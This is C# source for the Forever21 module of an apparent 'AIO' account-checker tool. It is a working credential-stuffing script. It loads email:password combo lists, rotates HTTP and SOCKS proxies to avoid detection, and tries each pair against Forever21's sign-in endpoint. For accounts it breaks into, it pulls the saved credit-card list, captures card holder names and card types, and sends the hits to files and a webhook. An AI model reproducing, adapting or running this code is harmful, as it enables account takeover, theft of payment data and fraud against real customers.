using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Forever21mod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.AllowAutoRedirect = false;
                            req.IgnoreProtocolErrors = true;
                            req.AddHeader("User-Agent",
                                "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                            req.AddHeader("Pragma", "no-cache");
                            req.AddHeader("Accept", "*/*");
                            req.SslCertificateValidatorCallback += (obj, cert, ssl, error) =>
                                (cert as X509Certificate2).Verify();
                            var str1 = Parse(req.Get("https://www.forever21.com/us/shop/account/signin").ToString(),
                                "window.NREUM||(NREUM={})).loader_config={xpid:\"", "\"");
                            req.ClearAllHeaders();
                            req.AddHeader("Host", "www.forever21.com");
                            req.AddHeader("Connection", "keep-alive");
                            req.AddHeader("Content-Length", "56");
                            req.AddHeader("Accept", "application/json, text/javascript, */*; q=0.01");
                            req.AddHeader("X-NewRelic-ID", str1);
                            req.AddHeader("X-Requested-With", "XMLHttpRequest");
                            req.AddHeader("User-Agent",
                                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36");
                            req.AddHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
                            req.AddHeader("Origin", "https://www.forever21.com");
                            req.AddHeader("Sec-Fetch-Site", "same-origin");
                            req.AddHeader("Sec-Fetch-Mode", "cors");
                            req.AddHeader("Sec-Fetch-Dest", "empty");
                            req.AddHeader("Referer", "https://www.forever21.com/us/shop/account/signin");
                            req.AddHeader("Accept-Encoding", "gzip, deflate, br");
                            req.AddHeader("Accept-Language", "en-US,en;q=0.9");
                            var str2 = "userid=&id=" + array[0] + "&password=" + array[1] + "&isGuest=";
                            var source1 = req.Post("https://www.forever21.com/us/shop/Account/DoSignIn", str2,
                                "application/x-www-form-urlencoded").ToString();
                            if (!source1.Contains("User cannot be found") &&
                                !source1.Contains("Your email or password is incorrect. Please try again."))
                            {
                                if (source1.Contains("\"ErrorMessage\":\"\""))
                                {
                                    var str3 = Parse(source1, "\"UserId\":\"", "\"");
                                    req.AddHeader("X-NewRelic-ID", str1);
                                    var str4 = "userid=" + str3;
                                    var source2 = req
                                        .Post("https://www.forever21.com/us/shop/Account/GetCreditCardList", str4,
                                            "application/x-www-form-urlencoded").ToString();
                                    if (source2.Contains("Credit Card Information cannot be found."))
                                    {
                                        Program.Frees++;
                                        Program.TotalChecks++;
                                        Export.AsResult("/Forever21_frees", array[0] + ":" + array[1]);
                                        if (Program.lorc == "LOG")
                                            Settings.PrintFree("Forever21", array[0] + ":" + array[1]);
                                        if (Settings.sendToWebhook)
                                            Settings.sendTowebhook1(array[0] + ":" + array[1], "Forever21 Frees");
                                    }

                                    if (source2.Contains("CardHolder") || source2.Contains("CardType") ||
                                        source2.Contains("DisplayName"))
                                    {
                                        try
                                        {
                                            var str5 = Parse(source2, ",\"CardHolder\":\"", "\",\"");
                                            var str6 = Parse(source2, ",\"CardType\":\"", "\",\"");
                                            Program.Hits++;
                                            Program.TotalChecks++;
                                            Export.AsResult("/Forever21_hits",
                                                array[0] + ":" + array[1] + " | Card Holder: " + str5 +
                                                " | PaymentType: " + str6);
                                            if (Program.lorc == "LOG")
                                                Settings.PrintHit("Forever21", array[0] + ":" + array[1]);
                                            if (Settings.sendToWebhook)
                                                Settings.sendTowebhook1(
                                                    array[0] + ":" + array[1] + " | Card Holder: " + str5 +
                                                    " | PaymentType: " + str6, "Forever21");
                                        }
                                        catch
                                        {
                                            Program.Hits++;
                                            Program.TotalChecks++;
                                            Export.AsResult("/Forever21_hits_cap_error",
                                                array[0] + ":" + array[1] + " | Error in Capture");
                                            if (Program.lorc == "LOG")
                                                Settings.PrintHit("Forever21", array[0] + ":" + array[1]);
                                            if (Settings.sendToWebhook)
                                                Settings.sendTowebhook1(array[0] + ":" + array[1], "Forever21");
                                        }

                                        req.Dispose();
                                    }
                                }
                            }
                            else if (source1.Contains("User cannot be found") &&
                                     source1.Contains("Your email or password is incorrect. Please try again."))
                            {
                                Program.Fails++;
                                Program.TotalChecks++;
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}